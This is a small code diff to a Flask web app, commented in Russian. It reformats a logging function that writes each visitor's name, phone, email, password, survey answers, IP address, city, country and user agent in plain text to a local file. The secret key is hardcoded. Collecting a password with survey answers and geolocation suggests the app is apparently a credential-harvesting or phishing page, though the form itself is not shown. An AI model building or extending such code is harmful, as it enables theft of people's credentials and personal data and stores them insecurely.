@@ -5,13 +5,16 @@ import os
 app = Flask(__name__)
 app.secret_key = 'very_secret_key'  # для хранения сессии
 
+LOG_FILE = 'log.txt'
+
 def save_response(data):
-    with open('log.txt', 'a', encoding='utf-8') as f:
+    with open(LOG_FILE, 'a', encoding='utf-8') as f:
         f.write(
-            f"{data['name']} | {data['phone']} | {data['email']} | {data['password']} | "
-            f"{data['answers']} | {data['ip']} | {data['location']['city']} | "
-            f"{data['location']['country']} | {data['user_agent']}\n"
+            f"Имя: {data['name']} | Телефон: {data['phone']} | Email: {data['email']} | Пароль: {data['password']} | "
+            f"Ответы: {data['answers']} | IP: {data['ip']} | Город: {data['location']['city']} | "
+            f"Страна: {data['location']['country']} | User-Agent: {data['user_agent']}\n"
         )
+    print("[✔] Данные сохранены в log.txt")
 
 @app.route('/', methods=['GET', 'POST'])
 def index():
